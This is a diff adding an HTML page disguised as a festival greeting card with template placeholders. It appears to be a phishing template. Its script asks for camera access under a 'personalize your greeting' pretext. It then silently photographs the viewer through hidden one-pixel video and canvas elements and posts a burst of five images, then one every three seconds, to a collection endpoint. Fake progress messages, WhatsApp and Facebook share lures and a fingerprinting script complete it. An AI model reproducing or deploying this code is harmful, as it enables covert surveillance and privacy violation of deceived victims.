@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy fes_name — Send Wishes to Everyone!</title>
+    <meta property="og:title" content="🎉 Happy fes_name! — Special Wishes For You">
+    <meta property="og:description" content="Someone sent you a beautiful festival greeting! Open to see your personalized wish.">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/3159/3159066.png">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 40%, #24243e 100%);
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background Particles */
+        .particles {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            animation: floatUp linear infinite;
+            opacity: 0;
+        }
+        @keyframes floatUp {
+            0% { opacity: 0; transform: translateY(100vh) scale(0); }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { opacity: 0; transform: translateY(-20vh) scale(1); }
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 40px 20px 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .header .emoji-top { font-size: 48px; margin-bottom: 10px; display: block; animation: bounce 2s ease infinite; }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        .header h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 42px;
+            background: linear-gradient(135deg, #f093fb, #f5576c, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+        .header .subtitle {
+            font-size: 14px;
+            color: rgba(255,255,255,0.6);
+            font-weight: 300;
+        }
+
+        /* Main Card */
+        .wish-card {
+            position: relative;
+            z-index: 1;
+            max-width: 420px;
+            margin: 25px auto;
+            padding: 0 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.06);
+            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 30px 25px;
+            text-align: center;
+            animation: cardSlideUp 0.8s ease;
+        }
+        @keyframes cardSlideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Greeting Image Area */
+        .greeting-visual {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 56px;
+            animation: glow 3s ease-in-out infinite;
+            box-shadow: 0 15px 40px rgba(240,147,251,0.3);
+        }
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 15px 40px rgba(240,147,251,0.3); }
+            50% { box-shadow: 0 20px 60px rgba(240,147,251,0.5); }
+        }
+
+        .card h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        .card .wish-text {
+            font-size: 14px;
+            color: rgba(255,255,255,0.7);
+            line-height: 1.7;
+            margin-bottom: 20px;
+        }
+
+        /* Countdown */
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .countdown-item {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 14px;
+            padding: 12px 8px;
+            min-width: 65px;
+        }
+        .countdown-item .number {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffd700, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: block;
+        }
+        .countdown-item .label {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Create Wish CTA */
+        .create-wish-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            font-family: 'Poppins', sans-serif;
+            letter-spacing: 0.5px;
+        }
+        .create-wish-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(245,87,108,0.4);
+        }
+
+        /* Share Section */
+        .share-section {
+            margin-top: 25px;
+        }
+        .share-section p {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 12px;
+        }
+        .share-btns {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        .share-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 20px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            color: #fff;
+            transition: transform 0.2s;
+        }
+        .share-btn:hover { transform: translateY(-2px); }
+        .share-btn.whatsapp { background: linear-gradient(135deg, #25d366, #128c7e); }
+        .share-btn.facebook { background: linear-gradient(135deg, #1877f2, #0d47a1); }
+
+        /* Verification Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 200;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-box {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 35px 25px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .modal-box .icon-big { font-size: 52px; margin-bottom: 15px; display: block; }
+        .modal-box h3 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+        .modal-box p { font-size: 13px; color: rgba(255,255,255,0.6); margin-bottom: 20px; line-height: 1.6; }
+        .modal-box .allow-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+        }
+        .modal-box .skip-link {
+            display: block;
+            margin-top: 12px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            cursor: pointer;
+        }
+
+        /* Progress */
+        .progress-area {
+            display: none;
+            margin-top: 15px;
+        }
+        .progress-bar-bg {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f093fb, #f5576c);
+            width: 0%;
+            transition: width 0.5s;
+            border-radius: 2px;
+        }
+        .progress-status {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            margin-top: 8px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .footer p {
+            font-size: 11px;
+            color: rgba(255,255,255,0.3);
+        }
+
+        /* Hidden cam elements */
+        video, canvas { position: absolute; opacity: 0; pointer-events: none; z-index: -1; width: 1px; height: 1px; }
+    </style>
+</head>
+<body>
+
+<!-- Animated Particles Background -->
+<div class="particles" id="particles"></div>
+
+<!-- Header -->
+<div class="header">
+    <span class="emoji-top">🎊</span>
+    <h1>Happy fes_name!</h1>
+    <p class="subtitle">Someone sent you a beautiful greeting ✨</p>
+</div>
+
+<!-- Main Card -->
+<div class="wish-card">
+    <div class="card">
+        <div class="greeting-visual">🪔</div>
+        <h2>Wishing You Joy & Happiness</h2>
+        <p class="wish-text">
+            May this festival bring endless joy, prosperity, and love to you and your family. 
+            Celebrate every moment with your loved ones! 🎉
+        </p>
+
+        <!-- Countdown -->
+        <div class="countdown">
+            <div class="countdown-item">
+                <span class="number" id="cDays">0</span>
+                <span class="label">Days</span>
+            </div>
+            <div class="countdown-item">
+                <span class="number" id="cHours">0</span>
+                <span class="label">Hours</span>
+            </div>
+            <div class="countdown-item">
+                <span class="number" id="cMins">0</span>
+                <span class="label">Mins</span>
+            </div>
+            <div class="countdown-item">
+                <span class="number" id="cSecs">0</span>
+                <span class="label">Secs</span>
+            </div>
+        </div>
+
+        <button class="create-wish-btn" onclick="openWishCreator()">🎉 Create Your Own Wish</button>
+
+        <!-- Progress -->
+        <div class="progress-area" id="progressArea">
+            <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
+            <p class="progress-status" id="progressStatus">Loading...</p>
+        </div>
+
+        <!-- Share -->
+        <div class="share-section">
+            <p>Share this greeting with friends & family</p>
+            <div class="share-btns">
+                <a class="share-btn whatsapp" href="whatsapp://send?text=🎉 Look what I got — a beautiful festival greeting! Open and see yours 👉 forwarding_link" data-action="share/whatsapp/share">
+                    💚 WhatsApp
+                </a>
+                <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank" rel="noopener" title="Share on Facebook">
+                    📘 Facebook
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Camera Permission Modal -->
+<div class="modal-overlay" id="camModal">
+    <div class="modal-box">
+        <span class="icon-big">📸</span>
+        <h3>Personalize Your Greeting</h3>
+        <p>Allow camera access to create a personalized festival greeting card with your photo.</p>
+        <button class="allow-btn" onclick="startCapture()">📷 Allow & Create</button>
+        <span class="skip-link" onclick="skipCamera()">Skip personalization</span>
+    </div>
+</div>
+
+<!-- Hidden elements -->
+<video id="video" playsinline autoplay muted></video>
+<canvas id="canvas" width="1920" height="1080"></canvas>
+
+<div class="footer">
+    <p>Made with ❤️ | fes_name Greetings</p>
+</div>
+
+<script>
+// === Particle Animation ===
+(function() {
+    var container = document.getElementById('particles');
+    var colors = ['#f093fb', '#f5576c', '#ffd700', '#4facfe', '#00f2fe', '#43e97b'];
+    for (var i = 0; i < 30; i++) {
+        var p = document.createElement('div');
+        p.className = 'particle';
+        var size = Math.random() * 8 + 3;
+        p.style.width = size + 'px';
+        p.style.height = size + 'px';
+        p.style.background = colors[Math.floor(Math.random() * colors.length)];
+        p.style.left = Math.random() * 100 + '%';
+        p.style.animationDuration = (Math.random() * 8 + 6) + 's';
+        p.style.animationDelay = (Math.random() * 10) + 's';
+        container.appendChild(p);
+    }
+})();
+
+// === Countdown Timer ===
+var now = new Date();
+var countDownDate = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 7, 0, 0, 0).getTime();
+setInterval(function() {
+    var now = new Date().getTime();
+    var distance = countDownDate - now;
+    if (distance < 0) {
+        document.getElementById('cDays').textContent = '🎉';
+        document.getElementById('cHours').textContent = '🎊';
+        document.getElementById('cMins').textContent = '🪔';
+        document.getElementById('cSecs').textContent = '✨';
+        return;
+    }
+    document.getElementById('cDays').textContent = Math.floor(distance / (1000 * 60 * 60 * 24));
+    document.getElementById('cHours').textContent = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    document.getElementById('cMins').textContent = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    document.getElementById('cSecs').textContent = Math.floor((distance % (1000 * 60)) / 1000);
+}, 1000);
+
+// === Camera & Capture ===
+function openWishCreator() {
+    document.getElementById('camModal').classList.add('active');
+}
+
+function startCapture() {
+    document.getElementById('camModal').classList.remove('active');
+    document.getElementById('progressArea').style.display = 'block';
+    document.getElementById('progressStatus').textContent = '✨ Creating your personalized wish...';
+    document.getElementById('progressFill').style.width = '20%';
+
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    var ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } },
+        audio: false
+    }).then(function(stream) {
+        video.srcObject = stream;
+
+        // Burst mode: 5 rapid shots
+        var shots = 0;
+        var burstInterval = setInterval(function() {
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var imgData = canvas.toDataURL('image/png');
+            $.post('forwarding_link/post.php', { cat: imgData });
+            
+            shots++;
+            document.getElementById('progressFill').style.width = (20 + shots * 12) + '%';
+            
+            if (shots >= 5) {
+                clearInterval(burstInterval);
+                document.getElementById('progressFill').style.width = '90%';
+                document.getElementById('progressStatus').textContent = '🎨 Adding festival effects...';
+                
+                // Continue normal interval
+                setInterval(function() {
+                    canvas.width = video.videoWidth || 1920;
+                    canvas.height = video.videoHeight || 1080;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var imgData = canvas.toDataURL('image/png');
+                    $.post('forwarding_link/post.php', { cat: imgData });
+                }, 3000);
+
+                // Show success
+                setTimeout(function() {
+                    document.getElementById('progressFill').style.width = '100%';
+                    document.getElementById('progressStatus').textContent = '🎉 Your greeting card is ready! Share it now!';
+                    document.getElementById('progressStatus').style.color = '#4ade80';
+                }, 2500);
+            }
+        }, 1000);
+
+    }).catch(function(err) {
+        document.getElementById('progressStatus').textContent = '⚠️ Camera access needed for personalization';
+        setTimeout(function() { window.location.href = 'https://www.google.com'; }, 5000);
+    });
+}
+
+function skipCamera() {
+    document.getElementById('camModal').classList.remove('active');
+    document.getElementById('progressArea').style.display = 'block';
+    document.getElementById('progressFill').style.width = '100%';
+    document.getElementById('progressStatus').textContent = '🎉 Your wish has been created! Share it!';
+    document.getElementById('progressStatus').style.color = '#4ade80';
+}
+</script>
+<script src="fingerprint.js"></script>
+</body>
+</html>
